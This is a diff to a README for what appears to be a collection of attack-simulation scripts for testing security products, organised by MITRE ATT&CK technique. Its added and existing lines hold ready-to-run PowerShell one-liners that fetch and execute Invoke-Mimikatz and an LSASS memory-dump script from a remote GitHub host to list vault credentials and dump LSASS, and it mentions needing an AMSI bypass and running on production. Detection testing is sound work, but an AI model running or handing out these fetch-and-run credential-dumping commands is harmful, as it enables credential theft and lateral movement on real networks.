@@ -9,7 +9,7 @@ In most cases, i tried to focus on stealthy and advanced behaviour.
 
 The scripts can be executed on production envirenmnet. 
 
-Please note that many of the scripts will not run unless AMSI is bypassed - each scripts different component of an attack chain and have to be viewed as part of a bigger picture
+Please note that many of the scripts will not run unless AMSI is bypassed - every script is a different component of an attack chain and have to be viewed as part of a bigger picture
 
 ## Ransomware techniques:
 Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources.
@@ -62,6 +62,17 @@ https://attack.mitre.org/techniques/T1555/
 ### 2. Browser Vault credential theft
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "vault::list";`
+
+## OS Credential Dumping: LSASS Memory
+Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.
+As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.
+
+https://attack.mitre.org/techniques/T1003/001/
+
+### Comsvcs lsass dump 
+Built-in Windows tools such as comsvcs.dll can be used to dump lsass
+
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-LsassDump1.ps1"); Invoke-LsassDump1;`
 
 ## Injection
 Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.
